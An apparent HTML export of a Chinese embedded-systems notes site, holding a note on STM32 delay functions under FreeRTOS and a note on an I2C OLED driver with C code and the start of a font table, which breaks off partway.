<li><a href="https://zhuanlan.zhihu.com/p/646423978">STM32CubeMx+freeRTOS - 知乎 (zhihu.com)</a></li>
<li><a href="https://blog.csdn.net/qq_45396672/article/details/120877303">CubeMX使用FreeRTOS编程指南_cubemx freertos-CSDN博客</a></li>
<li><a href="https://www.bilibili.com/video/BV1vd4y197vB/?spm_id_from=333.788.recommend_more_video.-1&amp;vd_source=e03d48176855fc5349b27aef691f9cdb">STM32HAL库纯使用向教学，STM32HAL库学习（三）外部中断（GPIO函数讲解）_哔哩哔哩_bilibili</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="1401105135">
                            <a href="#1401105135">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 工程的创建 - 基于 HAL 库</span>
                                
                                <div class="record-links-context hover">
                                    <p>本文介绍使用 STM32CubeMX 创建一个包含 FreeRTOS 的工程。关于 STM32CubeMX 的安装另见：<a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link highlight">STM32 工程的创建 - 基于 HAL 库</a>。此外，这篇文章将在 <a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link highlight">基础工程</a> 之上直接实现利用 FreeRTOS 进行点灯操作。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1401105135">
                            <a href="#1401105135">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 工程的创建 - 基于 HAL 库</span>
                                
                                <div class="record-links-context hover">
                                    <p>如果还想接着移植 FreeRTOS，可以继续阅读这篇文章：<a href="#2115225612" title="STM32 移植 FreeRTOS - 基于 HAL 库" class="record-link highlight">STM32 移植 FreeRTOS - 基于 HAL 库</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3727808739">
                            <a href="#3727808739">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32+ESP8266+MQTT 实现阿里云温湿度监控及 LED 点灯（FreeRTOS+标准库 or HAL）</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>C 语言基本语法</li>
<li>STM32 工程创建，详看
<ul>
<li><a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link ">STM32 工程的创建 - 基于寄存器或标准库</a></li>
<li><a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link ">STM32 工程的创建 - 基于 HAL 库</a></li>
</ul>
</li>
<li>FreeRTOS 的移植，详看
<ul>
<li><a href="#2165426052" title="STM32 移植 FreeRTOS - 基于标准库" class="record-link ">STM32 移植 FreeRTOS - 基于标准库</a></li>
<li><a href="#2115225612" title="STM32 移植 FreeRTOS - 基于 HAL 库" class="record-link highlight">STM32 移植 FreeRTOS - 基于 HAL 库</a></li>
</ul>
</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="3318795350" class="record">
            <header>
                <h1 class="record-title">STM32 延时函数（FreeRTOS）</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                    <button class="btn" onclick="activeTag('STM32');">STM32</button>
                    
                    <button class="btn" onclick="activeTag('FreeRTOS');">FreeRTOS</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/4/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240404231737.webp</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>c5d0cc56</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>微秒、毫秒级别的延时</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>标准库（FreeRTOS）</h1>
<p>试用前需要调用 <code>SysTick_Init(SYSCLK)</code> 进行初始化，SYSCLK 一般选择 72。</p>
<pre><code class="language-c">#ifndef _SysTick_H
#define _SysTick_H
#include &quot;stm32f10x.h&quot;                  // Device header

//#include &quot;system.h&quot;

void SysTick_Init(uint8_t SYSCLK);
void Delay_ms(uint32_t nms);
void Delay_us(uint32_t nus);
void Delay_xms(uint32_t nms);

#endif

</code></pre>
<pre><code class="language-c">#include &quot;SysTick.h&quot;
#include &quot;FreeRTOS.h&quot;	//FreeRTOS使用		  
#include &quot;task.h&quot;
static uint8_t  fac_us=0;							//us延时倍乘数			   
static uint16_t fac_ms=0;							//ms延时倍乘数


//初始化延迟函数
//SYSTICK的时钟固定为AHB时钟，基础例程里面SYSTICK时钟频率为AHB/8
//SYSCLK:系统时钟频率
void SysTick_Init(uint8_t SYSCLK)
{
	uint32_t reload;
	SysTick_CLKSourceConfig(SysTick_CLKSource_HCLK);//选择外部时钟  HCLK
	fac_us=SystemCoreClock/1000000;				//不论是否使用OS,fac_us都需要使用
	reload=SystemCoreClock/1000000;				//每秒钟的计数次数 单位为M  
	reload*=1000000/configTICK_RATE_HZ;			//根据configTICK_RATE_HZ设定溢出时间
												//reload为24位寄存器,最大值:16777216,在72M下,约合0.233s左右	
	fac_ms=1000/configTICK_RATE_HZ;				//代表OS可以延时的最少单位	   

	SysTick-&gt;CTRL|=SysTick_CTRL_TICKINT_Msk;   	//开启SYSTICK中断
	SysTick-&gt;LOAD=reload; 						//每1/configTICK_RATE_HZ秒中断一次	
	SysTick-&gt;CTRL|=SysTick_CTRL_ENABLE_Msk;   	//开启SYSTICK				   
}								    


//延时nus
//nus:要延时的us数.	
//nus:0~204522252(最大值即2^32/fac_us@fac_us=168)	    								   
void Delay_us(uint32_t nus)
{		
	uint32_t ticks;
	uint32_t told,tnow,tcnt=0;
	uint32_t reload=SysTick-&gt;LOAD;				//LOAD的值	    	 
	ticks=nus*fac_us; 						//需要的节拍数 
	told=SysTick-&gt;VAL;        				//刚进入时的计数器值
	while(1)
	{
		tnow=SysTick-&gt;VAL;	
		if(tnow!=told)
		{	    
			if(tnow&lt;told)tcnt+=told-tnow;	//这里注意一下SYSTICK是一个递减的计数器就可以了.
			else tcnt+=reload-tnow+told;	    
			told=tnow;
			if(tcnt&gt;=ticks)break;			//时间超过/等于要延迟的时间,则退出.
		}  
	};										    
}  
//延时nms
//nms:要延时的ms数
//nms:0~65535
void Delay_ms(uint32_t nms)
{	
	if(xTaskGetSchedulerState()!=taskSCHEDULER_NOT_STARTED)//系统已经运行
	{		
		if(nms&gt;=fac_ms)						//延时的时间大于OS的最少时间周期 
		{ 
   			vTaskDelay(nms/fac_ms);	 		//FreeRTOS延时
		}
		nms%=fac_ms;						//OS已经无法提供这么小的延时了,采用普通方式延时    
	}
	Delay_us((uint32_t)(nms*1000));				//普通方式延时
}

//延时nms,不会引起任务调度
//nms:要延时的ms数
void Delay_xms(uint32_t nms)
{
	uint32_t i;
	for(i=0;i&lt;nms;i++) Delay_us(1000);
}

</code></pre>
<p>FreeRTOS 的微秒级延时：<code>vTaskDelay()</code>。</p>
<h1>HAL</h1>
<p>把系统时钟配置成 72Mhz。这里以使用 TIM1 时钟为例。CubeMX 配置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240404224201.webp" alt="image.png"></p>
<pre><code class="language-c">#ifndef _DELAY_H
#define _DELAY_H
#include &quot;tim.h&quot;
void delay_us(uint16_t nus);
#endif /*  _DELAY_H  */

</code></pre>
<pre><code class="language-c">#include &quot;delay.h&quot;

void delay_us(uint16_t nus)
{
	__HAL_TIM_SET_COUNTER(&amp;htim1, 0);
	__HAL_TIM_ENABLE(&amp;htim1);
	while (__HAL_TIM_GET_COUNTER(&amp;htim1) &lt; nus)
	{
	}
	__HAL_TIM_DISABLE(&amp;htim1);
}

</code></pre>
<p>至于毫秒级延时可以使用 HAL 库方法延时。毫秒级延时 FreeRTOS 还有另一种延时方法 <code>osDelay</code>。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/qq_27849725/article/details/121993479">四、【STM32 HAL库开发】TIM定时器：实现微秒延时___hal_tim_get_counter-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/m0_59766260/article/details/134098825">FreeRTOS中osDelay和HAL_Delay的区别-CSDN博客</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3298282303">
                            <a href="#3298282303">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>DHT11 驱动程序</span>
                                
                                <div class="record-links-context hover">
                                    <p>DHT11 对时序要求严格，需要微妙级延时，我们常用的 HAL_Delay 是毫秒级时延。由于 FreeRTOS 是不支持微秒级延时的，需要自己定义微秒级别的延时函数（详见：<a href="#3318795350" title="STM32 延时函数（FreeRTOS）" class="record-link highlight">STM32 延时函数（FreeRTOS）</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2349657556" class="record">
            <header>
                <h1 class="record-title">OLED 驱动程序</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('OLED');">OLED</button>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                    <button class="btn" onclick="activeTag('驱动');">驱动</button>
                    
                    <button class="btn" onclick="activeTag('HAL');">HAL</button>
                    
                    <button class="btn" onclick="activeTag('I2C');">I2C</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/4/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240404231539.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>江科大提供的驱动程序的改编。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>8c0cedd4</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>OLED 简介</h1>
<p>OLED（Organic Light Emitting Diode）：有机发光二极管。OLED 显示屏是一款性能优异的新型显示屏，具有功耗低、响应速度快、宽视角、轻薄柔韧等特点。OLED 模块大小为 0.96 寸 ，小巧玲珑、占用接口少、简单易用，是电子设计中非常常见的显示屏模块。</p>
<p>供电：3~5.5V，通信协议：I2C/SPI，分辨率：128*64</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240430165004.webp" alt="image.png"></p>
<p>硬件电路：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240430165042.webp" alt="image.png"></p>
<h1>I2C 通信协议</h1>
<p>I2C（Inter IC Bus）是由 Philips 公司开发的一种通用数据总线：</p>
<ul>
<li>两根通信线：SCL（Serial Clock）、SDA（Serial Data）</li>
<li>同步，半双工</li>
<li>带数据应答</li>
<li>支持总线挂载多设备（一主多从、多主多从）</li>
</ul>
<p>支持 I2C 通信协议的模块（分别为 MPU6050、<strong>OLED</strong>、AT24C02、DS3231）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240430165652.webp" alt="image.png"></p>
<h2>I2C 时序基本单元</h2>
<p>起始条件：SCL 高电平期间，SDA 从高电平切换到低电平</p>
<pre><code class="language-plantuml">@startuml
binary &quot;SCL&quot; as SCL
binary &quot;SDA&quot; as SDA

SCL is high
SDA is high
@0


@10
SDA is low

@15
SCL is low

@20

highlight 7 to 13 #Gold;line:DimGrey
@enduml
</code></pre>
<p>终止条件：SCL 高电平期间，SDA 从低电平切换到高电平</p>
<pre><code class="language-plantuml">@startuml
binary &quot;SCL&quot; as SCL
binary &quot;SDA&quot; as SDA

SCL is low
SDA is low
@0

@10
SCL is high

@15
SDA is high

@20

highlight 12 to 18 #Gold;line:DimGrey
@enduml
</code></pre>
<p>发送一个字节：SCL 低电平期间，主机将数据位依次放到 SDA 线上（高位先行），然后释放 SCL，从机将在 SCL 高电平期间读取数据位，所以 SCL 高电平期间 SDA 不允许有数据变化，依次循环上述过程 8 次，即可发送一个字节。</p>
<pre><code class="language-plantuml">@startuml
scale 10 as 100 pixels
binary &quot;SCL&quot; as SCL
concise &quot;SDA&quot; as SDA

SCL is low
SDA is &quot;...&quot;

@5
SDA is Bit7

@7
SCL is high

@13
SCL is low

@15
SDA is Bit6

@17
SCL is high

@23
SCL is low

@25
SDA is Bit5

@27
SCL is high

@33
SCL is low

@35
SDA is Bit4

@37
SCL is high

@43
SCL is low

@45
SDA is &quot;...&quot;

@enduml
</code></pre>
<p>接收一个字节：SCL 低电平期间，从机将数据位依次放到 SDA 线上（高位先行），然后释放 SCL，主机将在 SCL 高电平期间读取数据位，所以 SCL 高电平期间 SDA 不允许有数据变化，依次循环上述过程 8 次，即可接收一个字节（主机在接收之前，需要释放 SDA）</p>
<p>发送应答：主机在接收完一个字节之后，在下一个时钟发送一位数据，数据 0 表示应答，数据 1 表示非应答</p>
<p>接收应答：主机在发送完一个字节之后，在下一个时钟接收一位数据，判断从机是否应答，数据 0 表示应答，数据 1 表示非应答（主机在接收之前，需要释放 SDA）</p>
<p>指定地址写：对于指定设备（Slave Address），在指定地址（Reg Address）下，写入指定数据（Data）</p>
<p>当前地址读：对于指定设备（Slave Address），在当前地址指针指示的地址下，读取从机数据（Data）</p>
<p>I2C 基本结构：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240430171326.webp" alt="image.png|525"></p>
<p>所有 I2C 设备的 SCL 连在一起，SDA 连在一起。设备的 SCL 和 SDA 均要配置成开漏输出模式。</p>
<h1>驱动程序</h1>
<p>这里的 OLED 驱动程序可以简单输出一些 ASCII 内的字符。改编自江科大提供的驱动。</p>
<p>驱动函数表：</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>OLED_Init();<br></td>
<td>初始化</td>
</tr>
<tr>
<td>OLED_Clear();</td>
<td>清屏</td>
</tr>
<tr>
<td>OLED_ShowChar(1, 1, 'A');<br></td>
<td>显示一个字符</td>
</tr>
<tr>
<td>OLED_ShowString(1, 3, &quot;HelloWorld!&quot;);<br></td>
<td>显示字符串</td>
</tr>
<tr>
<td>OLED_ShowNum(2, 1, 12345, 5);<br></td>
<td>显示十进制数字</td>
</tr>
<tr>
<td>OLED_ShowSignedNum(2, 7, -66, 2);<br></td>
<td>显示有符号十进制数字</td>
</tr>
<tr>
<td>OLED_ShowHexNum(3, 1, 0xAA55, 4);<br></td>
<td>显示十六进制数字</td>
</tr>
<tr>
<td>OLED_ShowBinNum(4, 1, 0xAA55, 16);<br></td>
<td>显示二进制数字</td>
</tr>
</tbody>
</table>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240430165131.webp" alt="image.png|500"></p>
<p>OLED命令或数据的发送格式：</p>
<ul>
<li>发送Start信号；</li>
<li>发送从机地址（0x78）；</li>
<li>发送<strong>Control Byte</strong>，即控制字节，用于告诉OLED后续字节是命令还是数据；</li>
<li>发送数据字节（这里的数据可以是命令，也可以是写入显存的数据）；</li>
<li>依次类推，直到通信完成。</li>
</ul>
<h2>C 文件（标准库及 HAL）</h2>
<h3>标准库</h3>
<pre><code class="language-c">#include &quot;stm32f10x.h&quot;
#include &quot;OLED_Font.h&quot;

/*引脚配置*/
#define SCL_GPIO_Pin_x 		GPIO_Pin_8		// 根据实际情况进行修改 
#define SDA_GPIO_Pin_x 		GPIO_Pin_9		// 根据实际情况进行修改 
#define OLED_W_SCL(x)		GPIO_WriteBit(GPIOB, SCL_GPIO_Pin_x, (BitAction)(x))
#define OLED_W_SDA(x)		GPIO_WriteBit(GPIOB, SDA_GPIO_Pin_x, (BitAction)(x))

/*引脚初始化*/
void OLED_I2C_Init(void)
{
    RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOB, ENABLE);
	
	GPIO_InitTypeDef GPIO_InitStructure;
 	GPIO_InitStructure.GPIO_Mode = GPIO_Mode_Out_OD;
	GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;
	GPIO_InitStructure.GPIO_Pin = SCL_GPIO_Pin_x; // 使用了自己定义的宏
 	GPIO_Init(GPIOB, &amp;GPIO_InitStructure);
	GPIO_InitStructure.GPIO_Pin = SDA_GPIO_Pin_x; // 使用了自己定义的宏
 	GPIO_Init(GPIOB, &amp;GPIO_InitStructure);
	
	OLED_W_SCL(1);
	OLED_W_SDA(1);
}

/**
  * @brief  I2C开始
  * @param  无
  * @retval 无
  */
void OLED_I2C_Start(void)
{
	OLED_W_SDA(1);
	OLED_W_SCL(1);
	OLED_W_SDA(0);
	OLED_W_SCL(0);
}

/**
  * @brief  I2C停止
  * @param  无
  * @retval 无
  */
void OLED_I2C_Stop(void)
{
	OLED_W_SDA(0);
	OLED_W_SCL(1);
	OLED_W_SDA(1);
}

/**
  * @brief  I2C发送一个字节
  * @param  Byte 要发送的一个字节
  * @retval 无
  */
void OLED_I2C_SendByte(uint8_t Byte)
{
	uint8_t i;
	for (i = 0; i &lt; 8; i++)
	{
		OLED_W_SDA(Byte &amp; (0x80 &gt;&gt; i));
		OLED_W_SCL(1);
		OLED_W_SCL(0);
	}
	OLED_W_SCL(1);	//额外的一个时钟，不处理应答信号
	OLED_W_SCL(0);
}

/**
  * @brief  OLED写命令
  * @param  Command 要写入的命令
  * @retval 无
  */
void OLED_WriteCommand(uint8_t Command)
{
	OLED_I2C_Start();
	OLED_I2C_SendByte(0x78);		//从机地址
	OLED_I2C_SendByte(0x00);		//写命令
	OLED_I2C_SendByte(Command); 
	OLED_I2C_Stop();
}

/**
  * @brief  OLED写数据
  * @param  Data 要写入的数据
  * @retval 无
  */
void OLED_WriteData(uint8_t Data)
{
	OLED_I2C_Start();
	OLED_I2C_SendByte(0x78);		//从机地址
	OLED_I2C_SendByte(0x40);		//写数据
	OLED_I2C_SendByte(Data);
	OLED_I2C_Stop();
}

/**
  * @brief  OLED设置光标位置
  * @param  Y 以左上角为原点，向下方向的坐标，范围：0~7
  * @param  X 以左上角为原点，向右方向的坐标，范围：0~127
  * @retval 无
  */
void OLED_SetCursor(uint8_t Y, uint8_t X)
{
	OLED_WriteCommand(0xB0 | Y);					//设置Y位置
	OLED_WriteCommand(0x10 | ((X &amp; 0xF0) &gt;&gt; 4));	//设置X位置高4位
	OLED_WriteCommand(0x00 | (X &amp; 0x0F));			//设置X位置低4位
}

/**
  * @brief  OLED清屏
  * @param  无
  * @retval 无
  */
void OLED_Clear(void)
{  
	uint8_t i, j;
	for (j = 0; j &lt; 8; j++)
	{
		OLED_SetCursor(j, 0);
		for(i = 0; i &lt; 128; i++)
		{
			OLED_WriteData(0x00);
		}
	}
}

/**
  * @brief  OLED显示一个字符
  * @param  Line 行位置，范围：1~4
  * @param  Column 列位置，范围：1~16
  * @param  Char 要显示的一个字符，范围：ASCII可见字符
  * @retval 无
  */
void OLED_ShowChar(uint8_t Line, uint8_t Column, char Char)
{      	
	uint8_t i;
	OLED_SetCursor((Line - 1) * 2, (Column - 1) * 8);		//设置光标位置在上半部分
	for (i = 0; i &lt; 8; i++)
	{
		OLED_WriteData(OLED_F8x16[Char - ' '][i]);			//显示上半部分内容
	}
	OLED_SetCursor((Line - 1) * 2 + 1, (Column - 1) * 8);	//设置光标位置在下半部分
	for (i = 0; i &lt; 8; i++)
	{
		OLED_WriteData(OLED_F8x16[Char - ' '][i + 8]);		//显示下半部分内容
	}
}

/**
  * @brief  OLED显示字符串
  * @param  Line 起始行位置，范围：1~4
  * @param  Column 起始列位置，范围：1~16
  * @param  String 要显示的字符串，范围：ASCII可见字符
  * @retval 无
  */
void OLED_ShowString(uint8_t Line, uint8_t Column, char *String)
{
	uint8_t i;
	for (i = 0; String[i] != '\0'; i++)
	{
		OLED_ShowChar(Line, Column + i, String[i]);
	}
}

/**
  * @brief  OLED次方函数
  * @retval 返回值等于X的Y次方
  */
uint32_t OLED_Pow(uint32_t X, uint32_t Y)
{
	uint32_t Result = 1;
	while (Y--)
	{
		Result *= X;
	}
	return Result;
}

/**
  * @brief  OLED显示数字（十进制，正数）
  * @param  Line 起始行位置，范围：1~4
  * @param  Column 起始列位置，范围：1~16
  * @param  Number 要显示的数字，范围：0~4294967295
  * @param  Length 要显示数字的长度，范围：1~10
  * @retval 无
  */
void OLED_ShowNum(uint8_t Line, uint8_t Column, uint32_t Number, uint8_t Length)
{
	uint8_t i;
	for (i = 0; i &lt; Length; i++)							
	{
		OLED_ShowChar(Line, Column + i, Number / OLED_Pow(10, Length - i - 1) % 10 + '0');
	}
}

/**
  * @brief  OLED显示数字（十进制，带符号数）
  * @param  Line 起始行位置，范围：1~4
  * @param  Column 起始列位置，范围：1~16
  * @param  Number 要显示的数字，范围：-2147483648~2147483647
  * @param  Length 要显示数字的长度，范围：1~10
  * @retval 无
  */
void OLED_ShowSignedNum(uint8_t Line, uint8_t Column, int32_t Number, uint8_t Length)
{
	uint8_t i;
	uint32_t Number1;
	if (Number &gt;= 0)
	{
		OLED_ShowChar(Line, Column, '+');
		Number1 = Number;
	}
	else
	{
		OLED_ShowChar(Line, Column, '-');
		Number1 = -Number;
	}
	for (i = 0; i &lt; Length; i++)							
	{
		OLED_ShowChar(Line, Column + i + 1, Number1 / OLED_Pow(10, Length - i - 1) % 10 + '0');
	}
}

/**
  * @brief  OLED显示数字（十六进制，正数）
  * @param  Line 起始行位置，范围：1~4
  * @param  Column 起始列位置，范围：1~16
  * @param  Number 要显示的数字，范围：0~0xFFFFFFFF
  * @param  Length 要显示数字的长度，范围：1~8
  * @retval 无
  */
void OLED_ShowHexNum(uint8_t Line, uint8_t Column, uint32_t Number, uint8_t Length)
{
	uint8_t i, SingleNumber;
	for (i = 0; i &lt; Length; i++)							
	{
		SingleNumber = Number / OLED_Pow(16, Length - i - 1) % 16;
		if (SingleNumber &lt; 10)
		{
			OLED_ShowChar(Line, Column + i, SingleNumber + '0');
		}
		else
		{
			OLED_ShowChar(Line, Column + i, SingleNumber - 10 + 'A');
		}
	}
}

/**
  * @brief  OLED显示数字（二进制，正数）
  * @param  Line 起始行位置，范围：1~4
  * @param  Column 起始列位置，范围：1~16
  * @param  Number 要显示的数字，范围：0~1111 1111 1111 1111
  * @param  Length 要显示数字的长度，范围：1~16
  * @retval 无
  */
void OLED_ShowBinNum(uint8_t Line, uint8_t Column, uint32_t Number, uint8_t Length)
{
	uint8_t i;
	for (i = 0; i &lt; Length; i++)							
	{
		OLED_ShowChar(Line, Column + i, Number / OLED_Pow(2, Length - i - 1) % 2 + '0');
	}
}

/**
  * @brief  OLED初始化
  * @param  无
  * @retval 无
  */
void OLED_Init(void)
{
	uint32_t i, j;
	
	for (i = 0; i &lt; 1000; i++)			//上电延时
	{
		for (j = 0; j &lt; 1000; j++);
	}
	
	OLED_I2C_Init();			//端口初始化
	
	OLED_WriteCommand(0xAE);	//关闭显示
	
	OLED_WriteCommand(0xD5);	//设置显示时钟分频比/振荡器频率
	OLED_WriteCommand(0x80);
	
	OLED_WriteCommand(0xA8);	//设置多路复用率
	OLED_WriteCommand(0x3F);
	
	OLED_WriteCommand(0xD3);	//设置显示偏移
	OLED_WriteCommand(0x00);
	
	OLED_WriteCommand(0x40);	//设置显示开始行
	
	OLED_WriteCommand(0xA1);	//设置左右方向，0xA1正常 0xA0左右反置
	
	OLED_WriteCommand(0xC8);	//设置上下方向，0xC8正常 0xC0上下反置

	OLED_WriteCommand(0xDA);	//设置COM引脚硬件配置
	OLED_WriteCommand(0x12);
	
	OLED_WriteCommand(0x81);	//设置对比度控制
	OLED_WriteCommand(0xCF);

	OLED_WriteCommand(0xD9);	//设置预充电周期
	OLED_WriteCommand(0xF1);

	OLED_WriteCommand(0xDB);	//设置VCOMH取消选择级别
	OLED_WriteCommand(0x30);

	OLED_WriteCommand(0xA4);	//设置整个显示打开/关闭

	OLED_WriteCommand(0xA6);	//设置正常/倒转显示

	OLED_WriteCommand(0x8D);	//设置充电泵
	OLED_WriteCommand(0x14);

	OLED_WriteCommand(0xAF);	//开启显示
		
	OLED_Clear();				//OLED清屏
}

</code></pre>
<h3>HAL</h3>
<p>修改开头部分即可。</p>
<pre><code class="language-c">include &quot;stm32f1xx_hal.h&quot;
#include &quot;OLED_Font.h&quot;

/*引脚配置*/
#define SCL_GPIO_PIN_x 		GPIO_PIN_8		// 根据实际情况进行修改 
#define SDA_GPIO_PIN_x 		GPIO_PIN_9		// 根据实际情况进行修改 
#define OLED_W_SCL(x)		HAL_GPIO_WritePin(GPIOB, SCL_GPIO_PIN_x, (GPIO_PinState)(x))
#define OLED_W_SDA(x)		HAL_GPIO_WritePin(GPIOB, SDA_GPIO_PIN_x, (GPIO_PinState)(x))

/*引脚初始化*/
void OLED_I2C_Init(void)
{

	__HAL_RCC_GPIOB_CLK_ENABLE();
	
	GPIO_InitTypeDef GPIO_InitStructure;
	GPIO_InitStructure.Mode = GPIO_MODE_OUTPUT_OD;
	GPIO_InitStructure.Pin = SCL_GPIO_PIN_x|SDA_GPIO_PIN_x;
	GPIO_InitStructure.Speed = GPIO_SPEED_HIGH;
	
	HAL_GPIO_Init(GPIOB,&amp;GPIO_InitStructure);
	
	OLED_W_SCL(1);
	OLED_W_SDA(1);
}

/*** 其余和标准库中的一样 ***/
</code></pre>
<h2>头文件</h2>
<pre><code class="language-c">#ifndef __OLED_H
#define __OLED_H

void OLED_Init(void);
void OLED_Clear(void);
void OLED_ShowChar(uint8_t Line, uint8_t Column, char Char);
void OLED_ShowString(uint8_t Line, uint8_t Column, char *String);
void OLED_ShowNum(uint8_t Line, uint8_t Column, uint32_t Number, uint8_t Length);
void OLED_ShowSignedNum(uint8_t Line, uint8_t Column, int32_t Number, uint8_t Length);
void OLED_ShowHexNum(uint8_t Line, uint8_t Column, uint32_t Number, uint8_t Length);
void OLED_ShowBinNum(uint8_t Line, uint8_t Column, uint32_t Number, uint8_t Length);

#endif


</code></pre>
<h2>字体库文件</h2>
<pre><code class="language-c">#ifndef __OLED_FONT_H
#define __OLED_FONT_H

/*OLED字模库，宽8像素，高16像素*/
const uint8_t OLED_F8x16[][16]=
{
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,//  0
	
	0x00,0x00,0x00,0xF8,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x33,0x30,0x00,0x00,0x00,//! 1
	
	0x00,0x10,0x0C,0x06,0x10,0x0C,0x06,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,//&quot; 2
	
	0x40,0xC0,0x78,0x40,0xC0,0x78,0x40,0x00,
	0x04,0x3F,0x04,0x04,0x3F,0x04,0x04,0x00,//# 3
	
	0x00,0x70,0x88,0xFC,0x08,0x30,0x00,0x00,
	0x00,0x18,0x20,0xFF,0x21,0x1E,0x00,0x00,//$ 4
	
	0xF0,0x08,0xF0,0x00,0xE0,0x18,0x00,0x00,
	0x00,0x21,0x1C,0x03,0x1E,0x21,0x1E,0x00,//% 5
	
	0x00,0xF0,0x08,0x88,0x70,0x00,0x00,0x00,
	0x1E,0x21,0x23,0x24,0x19,0x27,0x21,0x10,//&amp; 6
	
	0x10,0x16,0x0E,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,//' 7
	
	0x00,0x00,0x00,0xE0,0x18,0x04,0x02,0x00,
	0x00,0x00,0x00,0x07,0x18,0x20,0x40,0x00,//( 8
	
	0x00,0x02,0x04,0x18,0xE0,0x00,0x00,0x00,
	0x00,0x40,0x20,0x18,0x07,0x00,0x00,0x00,//) 9
	
	0x40,0x40,0x80,0xF0,0x80,0x40,0x40,0x00,
	0x02,0x02,0x01,0x0F,0x01,0x02,0x02,0x00,//* 10
	
	0x00,0x00,0x00,0xF0,0x00,0x00,0x00,0x00,
	0x01,0x01,0x01,0x1F,0x01,0x01,0x01,0x00,//+ 11
	
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x80,0xB0,0x70,0x00,0x00,0x00,0x00,0x00,//, 12
	
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x01,0x01,0x01,0x01,0x01,0x01,0x01,//- 13
	
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x30,0x30,0x00,0x00,0x00,0x00,0x00,//. 14
	
	0x00,0x00,0x00,0x00,0x80,0x60,0x18,0x04,
	0x00,0x60,0x18,0x06,0x01,0x00,0x00,0x00,/// 15
	
	0x00,0xE0,0x10,0x08,0x08,0x10,0xE0,0x00,
	0x00,0x0F,0x10,0x20,0x20,0x10,0x0F,0x00,//0 16
	
	0x00,0x10,0x10,0xF8,0x00,0x00,0x00,0x00,
	0x00,0x20,0x20,0x3F,0x20,0x20,0x00,0x00,//1 17
	
	0x00,0x70,0x08,0x08,0x08,0x88,0x70,0x00,
	0x00,0x30,0x28,0x24,0x22,0x21,0x30,0x00,//2 18
	
